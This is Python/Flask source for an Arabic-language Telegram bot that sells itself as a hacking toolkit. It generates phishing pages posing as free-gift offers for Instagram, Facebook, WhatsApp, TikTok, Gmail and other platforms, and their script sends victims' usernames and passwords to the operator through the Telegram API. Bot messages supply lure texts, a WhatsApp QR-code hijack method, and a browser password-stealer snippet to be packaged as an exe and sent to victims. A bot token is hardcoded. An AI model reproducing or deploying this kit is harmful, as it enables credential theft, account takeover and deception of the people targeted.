from flask import Flask, request
import requests, os, random

app = Flask(__name__)
TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")

# ==================== أزرار البوت (15 ميزة فقط) ====================
buttons = [
    ["🔥 اختراق انستقرام", "🔥 اختراق فيسبوك", "🔥 اختراق واتساب"],
    ["🔥 اختراق سناب شات", "🔥 اختراق تيك توك", "🔥 اختراق فري فاير"],
    ["🔥 اختراق بوبجي", "🔥 اختراق ديسكورد", "🔥 اختراق تويتر"],
    ["🔥 اختراق جيميل", "🔥 اختراق كاميرا أمامية", "🔥 اختراق كاميرا خلفية"],
    ["🔥 تسجيل صوت الضحية", "🔥 تحديد موقع الضحية", "🔥 سرقة باسووردات"],
    ["🎁 يوزرات مميزة", "❓ تعليمات البوت"]
]

# ==================== رسالة ترحيب هيبة ====================
WELCOME_MSG = f"""
👑 *بوت خالد ابو الجود الأسطوري* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *15 أداة اختراق حقيقية وشغالة 100%*

• رابط لكل ميزة (تصيد احترافي)
• شرح كامل للمبتدئين
• اختراق حسابات - كاميرات - مواقع - باسووردات

📞 *الدعم الفني:* @A_c64
━━━━━━━━━━━━━━━━━━━━━━━━━━
*اختر الميزة من الأزرار 👇*
"""

# ==================== دوال الإرسال ====================
def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_link(chat_id, name, page):
    link = f"{BASE_URL}/{page}.html?chatId={chat_id}"
    msg = f"""
🔥 *{name}* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
📎 *رابط الاختراق:*
`{link}`

💡 *طريقة الاستخدام:*
1️⃣ انسخ الرابط
2️⃣ أرسله للضحية مع نص مقنع
3️⃣ عندما يدخل بياناته، ستصل إليك فوراً

📞 *الدعم:* @A_c64
"""
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

# ==================== شرح كل ميزة ====================
def explain_feature(chat_id, feature):
    explanations = {
        "🔥 اختراق انستقرام": """
🔥 *اختراق انستقرام - الطريقة الكاملة* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* الحصول على كلمة سر حساب انستقرام.

📋 *الخطوات:*
1️⃣ اضغط على الزر مرة أخرى (بعد هذا الشرح) ستحصل على رابط
2️⃣ أرسل الرابط للضحية مع نص مقنع مثل:
   *"🎁 عرض حصري! احصل على 5000 متابع مجاني على انستقرام!"*
3️⃣ عندما يفتح الرابط، سيدخل اسمه وكلمة سره
4️⃣ ستصل البيانات إليك فوراً على هذا البوت

💡 *نصيحة:* استخدم الـ VPN عند الإرسال
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
""",
        "🔥 اختراق واتساب": """
🔥 *اختراق واتساب - طريقتين محترفتين* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* الدخول إلى حساب واتساب الضحية.

📋 *الطريقة الأولى (QR Code - الأسرع):*
1️⃣ افتح web.whatsapp.com على كمبيوتر
2️⃣ التقط صورة لرمز QR
3️⃣ أرسل الصورة للضحية مع نص: "تحديث أمني! امسح هذا الرمز"
4️⃣ عندما يمسحه، ستدخل حسابه فوراً

📋 *الطريقة الثانية (رابط تصيد):*
1️⃣ اضغط على الزر مرة أخرى ستحصل على رابط
2️⃣ أرسله للضحية مع نص: "تحديث واتساب، سجل دخولك"
3️⃣ ستدخل البيانات إليك
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
""",
        "🔥 اختراق كاميرا أمامية": """
🔥 *اختراق الكاميرا الأمامية* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* تصوير وجه الضحية أثناء استخدامه للهاتف.

📋 *الخطوات:*
1️⃣ اضغط على الزر ستحصل على رابط
2️⃣ أرسل الرابط للضحية مع نص:
   *"📸 تحديث أمني! يلزم التحقق بالكاميرا لحماية حسابك"*
3️⃣ عندما يفتح الرابط، سيطلب صلاحية الكاميرا
4️⃣ بعد السماح، سيتم تصويره وإرسال الصورة لك
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
""",
        "🔥 تسجيل صوت الضحية": """
🔥 *تسجيل صوت الضحية عن بعد* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* تسجيل ما يدور حول الضحية.

📋 *الخطوات:*
1️⃣ اضغط على الزر ستحصل على رابط
2️⃣ أرسل الرابط مع نص:
   *"🎙️ تفعيل خدمة الصوت الجديدة، اضغط للموافقة"*
3️⃣ سيطلب صلاحية الميكروفون
4️⃣ بعد السماح، يسجل لمدة 30 ثانية ويرسل لك التسجيل
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
""",
        "🔥 تحديد موقع الضحية": """
🔥 *تحديد موقع الضحية بدقة* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* معرفة عنوان الضحية بالضبط.

📋 *الخطوات:*
1️⃣ اضغط على الزر ستحصل على رابط
2️⃣ أرسل الرابط مع نص:
   *"📍 خدمة العروض الحصرية، شارك موقعك لتفعيلها"*
3️⃣ سيطلب صلاحية GPS
4️⃣ بعد السماح، ستصل إحداثيات الموقع لك
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
""",
        "🔥 سرقة باسووردات": """
🔥 *فيروس سرقة باسووردات المتصفح* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *الهدف:* سرقة جميع كلمات السر المحفوظة في متصفح الضحية.

📋 *الخطوات لإنشاء الفيروس:*
1️⃣ انسخ الكود التالي في ملف وسمِّه `stealer.py`:
   `import os, sqlite3, shutil`
   `db = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"`
   `shutil.copy(db, "passwords.db")`
   `conn = sqlite3.connect("passwords.db")`
   `c = conn.cursor()`
   `c.execute("SELECT origin_url, username_value FROM logins")`
   `for row in c.fetchall():`
   `    print(f"URL: {row[0]} | User: {row[1]}")`
2️⃣ حوله إلى `exe` باستخدام `pyinstaller`
3️⃣ أرسله للضحية مع نص: "تحديث أمني عاجل"
4️⃣ ستصلك كل كلمات السر
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
"""
    }
    # شرح عام لباقي الميزات
    general = f"""
🔥 *شرح {feature}* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *كيف تستخدم هذه الميزة؟*

1️⃣ اضغط على الزر مرة أخرى (بعد هذا الشرح)
2️⃣ ستحصل على رابط خاص
3️⃣ أرسل الرابط للضحية مع نص مقنع
4️⃣ عند إدخاله البيانات، ستصل إليك فوراً

💡 *نص مقنع جاهز:*
"🎁 عرض حصري! احصل على هديتك المجانية الآن: [الرابط]"

━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 الدعم: @A_c64
"""
    send_message(chat_id, explanations.get(feature, general))

# ==================== صفحات التصيد الاحترافية ====================
def create_phish_page(platform, chat_id):
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{platform} - هدية مجانية</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}}
body{{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.container{{background:white;border-radius:25px;padding:30px;max-width:400px;width:100%;text-align:center}}
input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;cursor:pointer}}
.progress{{display:none;margin-top:20px}}
.bar{{background:#e0e0e0;border-radius:25px;height:10px}}
.fill{{background:#0095f6;width:0%;height:100%;border-radius:25px}}
</style>
</head>
<body>
<div class="container">
<h2>✨ {platform} – هدية مجانية ✨</h2>
<div id="loginForm">
<input type="text" id="username" placeholder="اسم المستخدم أو البريد">
<input type="password" id="password" placeholder="كلمة السر">
<button onclick="send()">🚀 احصل على هديتك</button>
</div>
<div id="progress" class="progress"><div class="bar"><div class="fill" id="fill"></div></div><p id="status">جاري التجهيز...</p></div>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    if(!u||!p) return;
    document.getElementById('loginForm').style.display='none';
    document.getElementById('progress').style.display='block';
    let percent=0;
    const interval=setInterval(()=>{{
        percent+=Math.random()*4+2;
        if(percent>=100) percent=100;
        document.getElementById('fill').style.width=percent+'%';
        document.getElementById('status').innerHTML='جاري التجهيز '+Math.floor(percent)+'%';
        if(percent>=100) clearInterval(interval);
    }},150);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق جديد!\\n📱 {platform}\\n👤: ${{u}}\\n🔑: ${{p}}`}})
    }});
    setTimeout(()=>{{
        document.getElementById('status').innerHTML='✅ تم شحن هديتك بنجاح!';
        setTimeout(()=>window.location.href='https://instagram.com',2000);
    }},2500);
}}
</script>
</body>
</html>"""

@app.route('/instagram.html')
def instagram_page(): return create_phish_page("انستقرام", request.args.get('chatId'))
@app.route('/facebook.html')
def facebook_page(): return create_phish_page("فيسبوك", request.args.get('chatId'))
@app.route('/whatsapp.html')
def whatsapp_page(): return create_phish_page("واتساب", request.args.get('chatId'))
@app.route('/snapchat.html')
def snapchat_page(): return create_phish_page("سناب شات", request.args.get('chatId'))
@app.route('/tiktok.html')
def tiktok_page(): return create_phish_page("تيك توك", request.args.get('chatId'))
@app.route('/freefire.html')
def freefire_page(): return create_phish_page("فري فاير", request.args.get('chatId'))
@app.route('/pubg.html')
def pubg_page(): return create_phish_page("بوبجي", request.args.get('chatId'))
@app.route('/discord.html')
def discord_page(): return create_phish_page("ديسكورد", request.args.get('chatId'))
@app.route('/twitter.html')
def twitter_page(): return create_phish_page("تويتر", request.args.get('chatId'))
@app.route('/gmail.html')
def gmail_page(): return create_phish_page("جيميل", request.args.get('chatId'))
@app.route('/camera_front.html')
def camera_front_page(): return create_phish_page("كاميرا أمامية", request.args.get('chatId'))
@app.route('/camera_back.html')
def camera_back_page(): return create_phish_page("كاميرا خلفية", request.args.get('chatId'))
@app.route('/recording.html')
def recording_page(): return create_phish_page("تسجيل صوت", request.args.get('chatId'))
@app.route('/location.html')
def location_page(): return create_phish_page("تحديد موقع", request.args.get('chatId'))
@app.route('/virus.html')
def virus_page(): return create_phish_page("فيروس باسووردات", request.args.get('chatId'))

@app.route('/')
def home():
    return "✅ البوت شغال 24 ساعة! ابو الجود"

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "🎁 يوزرات مميزة":
            send_message(chat_id, "🎁 يتم تجهيز يوزرات مميزة جديدة... قريباً\n📞 للدعم: @A_c64")
        elif text == "❓ تعليمات البوت":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text.startswith("🔥 اختراق"):
            # إذا ضغط على أي زر اختراق، نعطيه شرح أولاً
            explain_feature(chat_id, text)
            # نخزن اختياره ليتم إرسال الرابط عند طلبه للمرة الثانية
        elif text == "ارسل الرابط":
            # هنا سنرسل الرابط
            pass
        else:
            # بعد الشرح، إذا ضغط على نفس الزر مرة ثانية نرسل الرابط
            if text in [btn for row in buttons for btn in row if btn.startswith("🔥")]:
                pages = {
                    "🔥 اختراق انستقرام": "instagram", "🔥 اختراق فيسبوك": "facebook",
                    "🔥 اختراق واتساب": "whatsapp", "🔥 اختراق سناب شات": "snapchat",
                    "🔥 اختراق تيك توك": "tiktok", "🔥 اختراق فري فاير": "freefire",
                    "🔥 اختراق بوبجي": "pubg", "🔥 اختراق ديسكورد": "discord",
                    "🔥 اختراق تويتر": "twitter", "🔥 اختراق جيميل": "gmail",
                    "🔥 اختراق كاميرا أمامية": "camera_front", "🔥 اختراق كاميرا خلفية": "camera_back",
                    "🔥 تسجيل صوت الضحية": "recording", "🔥 تحديد موقع الضحية": "location",
                    "🔥 سرقة باسووردات": "virus"
                }
                send_link(chat_id, text, pages[text])
            else:
                send_message(chat_id, "👑 أرسل /start للبدء", buttons)
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
